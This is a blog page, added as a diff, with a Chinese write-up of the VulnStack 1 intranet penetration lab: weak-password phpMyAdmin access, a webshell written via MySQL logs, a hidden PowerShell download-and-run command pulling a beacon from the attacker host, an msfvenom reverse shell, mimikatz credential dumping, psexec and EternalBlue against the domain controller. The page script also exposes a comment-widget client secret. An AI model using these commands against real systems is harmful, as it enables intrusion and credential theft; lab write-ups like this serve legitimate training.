@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>内网渗透靶机-VulnStack 1 | Today is new</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://0xwi11.github.io/favicon.ico?v=1706710799621">
+<link rel="stylesheet" href="https://0xwi11.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="很久没搞内网了，打个内网渗透靶机试一下。
+靶机下载地址
+http://vulnstack.qiyuanxuetang.net/vuln/detail/2/
+WEB服务器：windows7系统
+外网网卡IP：192.168.92.3
+内网网卡..." />
+    <meta name="keywords" content="内网渗透,信息安全" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://0xwi11.github.io">
+        <img src="https://0xwi11.github.io/images/avatar.png?v=1706710799621" class="site-logo">
+        <h1 class="site-title">Today is new</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+          <a class="social-link" href="https://github.com/0xWi11?tab=overview&amp;from=2023-02-01&amp;to=2023-02-28" target="_blank">
+            <i class="fab fa-github"></i>
+          </a>
+        
+      
+        
+          <a class="social-link" href="https://twitter.com/0xwi11" target="_blank">
+            <i class="fab fa-twitter"></i>
+          </a>
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      相信美好的事情将会发生
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://0xwi11.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">内网渗透靶机-VulnStack 1</h2>
+            <div class="post-date">2021-02-21</div>
+            
+            <div class="post-content" v-pre>
+              <p>很久没搞内网了，打个内网渗透靶机试一下。<br>
+靶机下载地址<br>
+http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</p>
+<p>WEB服务器：windows7系统<br>
+<code>外网网卡IP：192.168.92.3</code><br>
+<code>内网网卡IP：192.168.52.143</code></p>
+<p>域成员：windows server 2003系统<br>
+<code>网卡IP:192.168.52.141</code></p>
+<p>域控服务器：windows server 2008系统<br>
+<code>网卡IP：192.168.52.138</code></p>
+<p>攻击机器：kali linux<br>
+<code>kali IP:192.168.92.2</code></p>
+<p>这里放一下之前做的笔记</p>
+<p><strong>信息收集的深度直接关系到内网渗透测试的成败</strong></p>
+<p>在进入内网之后首先要对当前所处的网络环境进行判断。</p>
+<p><strong>我是谁</strong>————当前机器角色的判断（web服务器？生产服务器？</p>
+<p><strong>这是哪</strong>————对当前机器所在网络环境的拓扑结构进行分析和判断</p>
+<p><strong>我在哪</strong>————对当前机器所处区域的判断（DMZ？生产区？办公区？</p>
+<p>在渗透测试中，典型的域权限提升过程，通常是围绕着收集明文凭据或者通过mimikatz提权等方法，在获取了管理员权限的系统中寻找域管理员登录进程，进而收集域管理员的凭据，如果说当前的系统中没有获得域管理员进程，而且当前的账户也不是域管理员账户，那么就只可以看看当前的账户在哪台机器上是管理员，再去另外一台机器试试机会。直到找到可以获取到域管理员的路径。</p>
+<p>所以说我们这次练习的流程应该是，get shell -&gt; 信息收集 -&gt; 提权 -&gt; 拿下域控</p>
+<p>首先我们的目标是get shell。<br>
+既然是同一个网段，那就先arp探测一下主机，发现192.168.92.3的主机<br>
+<img src="https://0xwi11.github.io/post-images/1645453342878.png" alt="" loading="lazy"><br>
+发现80端口开放HTTP服务，同时也可以看到mysql有未授权访问的漏洞。<br>
+<img src="https://0xwi11.github.io/post-images/1645453356328.png" alt="" loading="lazy"><br>
+直接访问IP发现phpstudy探针，发现绝对路径。<br>
+<img src="https://0xwi11.github.io/post-images/1645453360490.png" alt="" loading="lazy"><br>
+访问phpmyadmin，弱口令 root root<br>
+<img src="https://0xwi11.github.io/post-images/1645453425620.png" alt="" loading="lazy"><br>
+查看能不能select into 写shell， secure_file_priv为NULL，表示不能够写入，需要找另外的方法写shell。<br>
+<img src="https://0xwi11.github.io/post-images/1645453430125.png" alt="" loading="lazy"><br>
+尝试日志写SHELL<br>
+<img src="https://0xwi11.github.io/post-images/1645453433648.png" alt="" loading="lazy"><br>
+将日志选项打开<br>
+<img src="https://0xwi11.github.io/post-images/1645453436216.png" alt="" loading="lazy"><br>
+更改日志文件存放的路径，前面绝对路径的知识在这里用上了<br>
+<img src="https://0xwi11.github.io/post-images/1645453438674.png" alt="" loading="lazy"><br>
+直接select一句话木马<br>
+<img src="https://0xwi11.github.io/post-images/1645453442025.png" alt="" loading="lazy"><br>
+用蚁剑连接，可以执行CMD且权限为administrator<br>
+<img src="https://0xwi11.github.io/post-images/1645453445109.png" alt="" loading="lazy"><br>
+打开CS，选择部署反弹shell脚本，监听连接<br>
+<img src="https://0xwi11.github.io/post-images/1645453448191.png" alt="" loading="lazy"><br>
+在被控制的主机上面执行以下命令</p>
+<pre><code>powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://192.168.92.2:8022/wwii'))&quot;
+</code></pre>
+<p><img src="https://0xwi11.github.io/post-images/1645453452731.png" alt="" loading="lazy"><br>
+在CS上面可以看到目标以上线，这是靶场练习所以输入sleep 0修改心跳时间为0s<br>
+<img src="https://0xwi11.github.io/post-images/1645453456574.png" alt="" loading="lazy"><br>
+首先Net View做一下信息收集，查看域内主机<br>
+<img src="https://0xwi11.github.io/post-images/1645453461432.png" alt="" loading="lazy"><br>
+可以看到OWA的类型是PDC（主域控），所以说我们要入侵的目标找到了。<br>
+<img src="https://0xwi11.github.io/post-images/1645453465048.png" alt="" loading="lazy"><br>
+run一个mimikatz，导出密码<br>
+<img src="https://0xwi11.github.io/post-images/1645453470853.png" alt="" loading="lazy"><br>
+有了密码之后使用psexec来控制内网其他主机<br>
+<img src="https://0xwi11.github.io/post-images/1645453474776.png" alt="" loading="lazy"><br>
+选择管理员的账号和密码，点击launch<br>
+<img src="https://0xwi11.github.io/post-images/1645453478757.png" alt="" loading="lazy"><br>
+可以看到域控已上线，到此结束。<br>
+<img src="https://0xwi11.github.io/post-images/1645453482986.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1645453486539.png" alt="" loading="lazy"><br>
+后面还试了一下使用metasploit来完成渗透。<br>
+从蚁剑可以执行命令开始。<br>
+使用以下命令生成反弹shell木马。</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.92.2 lport=9856 -f exe &gt; shell3.exe
+</code></pre>
+<p><img src="https://0xwi11.github.io/post-images/1645453490832.png" alt="" loading="lazy"><br>
+然后进入msf，开启端口监听请求。</p>
+<pre><code>use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.92.2
+set lport 9856
+exploit
+</code></pre>
+<p><img src="https://0xwi11.github.io/post-images/1645453495226.png" alt="" loading="lazy"><br>
+使用蚁剑上传木马，并且执行。<br>
+<img src="https://0xwi11.github.io/post-images/1645453498523.png" alt="" loading="lazy"><br>
+看到主机上线<br>
+<img src="https://0xwi11.github.io/post-images/1645453502171.png" alt="" loading="lazy"><br>
+本机信息收集<br>
+<img src="https://0xwi11.github.io/post-images/1645453505523.png" alt="" loading="lazy"><br>
+顺便提一下权。<br>
+导出一下密码</p>
+<pre><code>load kiwi #mimikatz集成到了kiwi模块
+creds_all
+</code></pre>
+<p><img src="https://0xwi11.github.io/post-images/1645453509418.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1645453512271.png" alt="" loading="lazy"><br>
+将内网路由转发至msf</p>
+<pre><code>run get_local_subnets
+run autoroute -s 192.168.52.0/255.255.255.0
+</code></pre>
+<p><img src="https://0xwi11.github.io/post-images/1645453515547.png" alt="" loading="lazy"><br>
+将session放置于后台。<br>
+然后使用永恒之蓝打域控，可以看到已经获得了域控权限。<br>
+<img src="https://0xwi11.github.io/post-images/1645453519412.png" alt="" loading="lazy"></p>
+<p>参考链接<br>
+https://item.jd.com/12743210.html?cu=true&amp;utm_source=book.douban.com&amp;utm_medium=tuiguang&amp;utm_campaign=t_15055_&amp;utm_term=63c030b66e334ec993ca1b35feeb2722<br>
+https://blog.csdn.net/qq_46527080/article/details/112648202</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://0xwi11.github.io/tag/IU541InEM/" class="tag">
+                    内网渗透
+                  </a>
+                
+                  <a href="https://0xwi11.github.io/tag/amUzoEOq9/" class="tag">
+                    信息安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://0xwi11.github.io/post/oauth2/">
+                  <h3 class="post-title">
+                    OAuth2.0漏洞介绍和挖洞案例
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: 'b2be97bd4f11fa2c7ed0',
+        clientSecret: '7cd82370c455720ef14b1c828ee50582651f71c4',
+        repo: 'bolg-comment',
+        owner: '0xWi11',
+        admin: ['0xWi11'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
